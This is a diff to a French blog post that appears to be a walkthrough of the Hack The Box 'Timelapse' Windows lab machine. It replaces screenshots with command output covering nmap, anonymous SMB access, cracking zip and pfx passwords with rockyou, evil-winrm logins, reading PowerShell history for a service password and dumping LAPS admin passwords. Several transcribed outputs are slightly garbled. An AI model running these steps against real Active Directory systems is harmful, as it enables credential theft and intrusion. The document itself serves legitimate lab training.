@@ -50,16 +50,33 @@ Ici, vu qu'il s'agit d'une machine Windows qui ne répond pas au ping par défau
 nmap -Pn 10.10.11.152
 ```
 
-{{< image src="images/nmap-timelapse.png" caption="" alt="alter-text" height="" width="" position="center" command="fill" option="q100" class="img-fluid" title="image title" webp="false" >}}
+Résultats :
+```sh
+nmap -Pn 10.10.11.152
+
+Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.          
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-06-02 09:26 EDT
+Nmap scan report for 10.10.11.152
+Host is up (0.012s latency).
+Not shown: 990 filtered ports
+PORT      STATE SERVICE
+53/tcp    open  domain
+88/tcp    open  kerberos-sec
+135/tcp   open  msrpc
+389/tcp   open  ldap 
+445/tcp   open  microsoft-ds
+464/tcp   open  kpasswd5
+593/tcp   open  http-rpc-epmap
+639/tcp   open  ldapssl
+3268/tcp  open  globalcatLDAP
+3269/tcp  open  globalcatLDAPssl
+```
 
 On peut aussi utiliser l'option `-sV` pour en apprendre davantage sur les versions des services ouverts sur la machine :
 
 ```sh
 nmap -sV -Pn 10.10.11.152
 ```
-
-{{< image src="images/nmap-sV-timelapse.png" caption="" alt="alter-text" height="" width="" position="center" command="fill" option="q100" class="img-fluid" title="image title" webp="false" >}}
-
 
 Ici, nous pouvons voir plusieurs ports, tous liés à l'environnement Windows tel que kerberos et smb.
 {{< /tab >}}
@@ -79,7 +96,19 @@ SMB est le protocole de partage réseau de Windows. Il permet ainsi de partager 
 Sur Kali, on utilise l'outil smbclient qui permet de lister les partages de la machine.
 On utilise l'option `-L` pour lister les partages et `-N` pour se connecter sans mot de passe :
 
-{{< image src="images/smbclient-timelapse.png" caption="" alt="alter-text" height="" width="" position="center" command="fill" option="q100" class="img-fluid" title="image title" webp="false" >}}
+```sh
+smbclient -L 10.10.11.152 -N
+
+        Sharename    Type     Comment
+        _________    ____     _______
+        ADMIN$       Disk     Remote Admin
+        C$           Disk     Default Share
+        IPC$         IPC      Remote IPC
+        NETLOGON     Disk     Logon server share
+        Shares       Disk      
+        SYSVOL       Disk     Logon server share
+SMB1 disabled -- no workgroup available
+```
 
 On voit qu'on peut lister les partages.
 Les partages suivants sont des partages par défaut, sur lesquels il est rare d'avoir les droits :
@@ -106,17 +135,32 @@ Ainsi, le partage Shares est le plus intéressant, car il est a été créer par
 {{< /tab >}}{{< tab "Niveau 2" >}}
 
 Pour lister le contenu du dossier Shares et obtenir un shell interactif permettant de télécharger les fichiers, on utilise la commande suivante : 
-{{< image src="images/smbclient-list-timelapse.png" caption="" alt="alter-text" height="" width="" position="center" command="fill" option="q100" class="img-fluid" title="image title" webp="false" >}}
+```sh
+smbclient -U user1 //10.10.11.152/Shares
+Enter WORKGROUP\user1's password:
+Try "help" to get a list of possible commands.
+smb: \> dir
+  .                                    D        0  Mon Oct 25 17:39:15 2021
+  ..                                   D        0  Mon Oct 25 17:39:15 2021
+  Dev                                  D        0  Mon Oct 25 21:40:06 2021
+  Helpdesk                             D        0  Mon Oct 25 17:48:42 2021
+```
 
 L'option `-U` permet de spécifier un utilisateur. Ici on peut mettre n'importe quel utilisateur.
 
 On parcourt les dossiers et on trouve des fichiers LAPS dans HelpDesk et une archive protégée par mdp dans Dev.
 
 On récupère le fichier zip avec la commande mget :
-{{< image src="images/mget-timelapse.png" caption="" alt="alter-text" height="" width="" position="center" command="fill" option="q100" class="img-fluid" title="image title" webp="false" >}}
+```sh
+smb: \Dev\> mget winrm_backup.zip
+```
 
 Etant donné, que le zip est protégé par un mot de passe, on peut tenter de le brute force avec fcrackzip :
-{{< image src="images/fcrackzip-timelapse.png" caption="" alt="alter-text" height="" width="" position="center" command="fill" option="q100" class="img-fluid" title="image title" webp="false" >}}
+```sh
+sudo fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt winrm_backup.zip
+
+PASSWORD FOUND!!!!: pw == supremelegacy
+```
 
 On peut maintenant décompresser de l’archive avec unzip.
 A l'intérieur on y trouve une clé privée au format pfx protégé par un mot de passe.
@@ -126,20 +170,55 @@ Pour cela on peut utiliser l'outil crackpkcs12 : https://github.com/crackpkcs12/
 On utilise le dictionnaire rockyou. Il s'agit d'un dictionnaire contenant les mots de passe les plus courants, très utilisé dans les CTF.
 
 Crack du mot de passe du fichier pfx :
-{{< image src="images/pkcs-timelapse.png" caption="" alt="alter-text" height="" width="" position="center" command="fill" option="q100" class="img-fluid" title="image title" webp="false" >}}
+```sh
+crackpkcs12 -d /usr/share/wordlists/rockyou.txt legacyy_dev_auth.pfx
+
+Dictionary attack - starting 5 threads
+
+*********************************************************
+Dictionary attack - Thread 2 - Password found: thuglegacy
+*********************************************************
+```
 
 On peut maintenant extraire le certificat du fichier pfx, qui peut servir pour se connecter : 
-{{< image src="images/extract-pkcs-timelapse.png" caption="" alt="alter-text" height="" width="" position="center" command="fill" option="q100" class="img-fluid" title="image title" webp="false" >}}
+```sh
+openssl pkcs12 -in legacyy_dev_auth.pfx -clcerts -nokeys -out certificate.crt
+```
 
 ### Connexion avec WinRM
 
 Maintenant que nous avons récupérer toutes ces informations, nous pouvons nous connecter avec evil-winrm.
 Pour cela, nous avons besoin d'un nom d'utilisateur, du mot de passe, du certificat et de la clé privé :
-{{< image src="images/winrm1-timelapse.png" caption="" alt="alter-text" height="" width="" position="center" command="fill" option="q100" class="img-fluid" title="image title" webp="false" >}}
-
+```sh
+evil-winrm -i 10.10.11.152 -S -u Legacyy -p thuglegacy -c certificate.crt -k cert.pem
+```
+On obtient un shell interactif.
 On énumère les dossiers pour trouver le flag utilisateur. On peut utiliser la commande `dir -R` pour les afficher de façon récursive.
 
-{{< image src="images/enum-timelapse.png" caption="" alt="alter-text" height="" width="" position="center" command="fill" option="q100" class="img-fluid" title="image title" webp="false" >}}
+```sh
+dir -R
+
+  Directory C:\Users\legacyy
+
+Mode            LastWriteTime      Length Name
+____             ____________      ______ ____
+d-r---     4/16/2022  4:40 PM             Desktop
+d-r---    10/25/2021  8:22 AM             Documents
+d-r---    9/15/2018   12:19 AM            Downloads
+d-r---    9/15/2018   12:19 AM            Favorites
+d-r---    9/15/2018   12:19 AM            Links
+d-r---    9/15/2018   12:19 AM            Music
+d-r---    9/15/2018   12:19 AM            Pictures
+d-----    9/15/2018   12:19 AM            Saved Games
+d-r---    9/15/2018   12:19 AM            Videos
+
+  Directory: C:\Users\legacyy\Desktop
+Mode            LastWriteTime      Length Name
+____             ____________      ______ ____
+-a         4/16/2022  4:40 PM          40 passwords
+-ar        4/16/2022 12:23 AM          34 user.txt
+-a         4/16/2022 10:26 AM     1935872 winPEASx64.exe
+```
 
 {{< /tab >}}
 {{< /tabs >}}
@@ -158,27 +237,40 @@ On énumère les dossiers pour trouver le flag utilisateur. On peut utiliser la 
 Nous devons maintenant nous élever en privilèges afin d'obtenir le flag root.
 
 Ici, nous devons rechercher dans l’historique des commandes de legacyy :
-{{< image src="images/history-timelapse.png" caption="" alt="alter-text" height="" width="" position="center" command="fill" option="q100" class="img-fluid" title="image title" webp="false" >}}
-
+```powershell
+cat C:\Users\Legacyy\Appdata\Roaming\microsoft\windows\powershell\psreadline\ConsoleHost_history.txt
+Enter PEM pass phrase:
+whoami
+ipconfig /all
+netstat ano select-string LIST
+$so New-PSSessionOption -SkipCACheck -SkinCNCheck -SkipRevocationCheck
+Sp ConvertTo-SecureString E3RSQ62*12p7PLICSKWaxuay -AsPlainText -Force Sc New-Object System.Management.Automation.PsCredential ('svc_deploy', $p) invoke-command-computername Localhost credential Sc-port 5986 -usessi
+SessionOption Sso scriptblock (whoami)
+get-aduser-filter-properties
+exit
+```
 Nous voyons qu'un mot de passe a été utilisé pour svc_deploy : **E3R$Q62^12p7PLlC%KWaxuaV**.
 
 On se connecte avec le utilisateur svc_deploy (toujours avec Evil-WinRM):
-{{< image src="images/winrm2-timelapse.png" caption="" alt="alter-text" height="" width="" position="center" command="fill" option="q100" class="img-fluid" title="image title" webp="false" >}}
-
-
+```sh
+evil-winrm -i 10.10.11.152 -S -u svc_deploy -p E3R$Q62^12p7PLlC%KWaxuaV
+```
 De nouveau, en faisant `dir -R`, on se rend compte que LAPS est configuré. 
 LAPS est un utilitaire Windows permettant de modifier de façon cyclique le mot de passe Administrateur local. Seuls les utilisateurs autorisés peuvent visualiser ce mot de passe.
 Ce mot de passe est stocké dans les attributs Windows de l'ordinateur.
 
 Par chance, svc_deploy peut lire les attributs concernant LAPS.
- Avec la commande suivante, on les affiche :
-{{< image src="images/laps-timelapse.png" caption="" alt="alter-text" height="" width="" position="center" command="fill" option="q100" class="img-fluid" title="image title" webp="false" >}}
-
+On regarde une documentation de LAPS afin de connaitre les attributs concernés : https://www.it-connect.fr/chapitres/comment-afficher-les-mots-de-passe-laps/
+Avec la commande suivante, on les affiche :
+```powershell
+Get-ADComputer -Filter * -Properties ms-Mcs-AdmPwd, ms-Mcs-AdmPwdExpirationTime
+```
 ### Obtention du flag root
 On se connecte de nouveau avec evil-winrm avec le mot de passe obtenu et on récupère le flag root.
 
 Si on ne sait pas où est le flag root.txt :
-{{< image src="images/rootflag-timelapse.png" caption="" alt="alter-text" height="" width="" position="center" command="fill" option="q100" class="img-fluid" title="image title" webp="false" >}}
-
+```powershell
+get-childitem root.txt -path C:\ -recurse
+```
 {{< /tab >}}
 {{< /tabs >}}
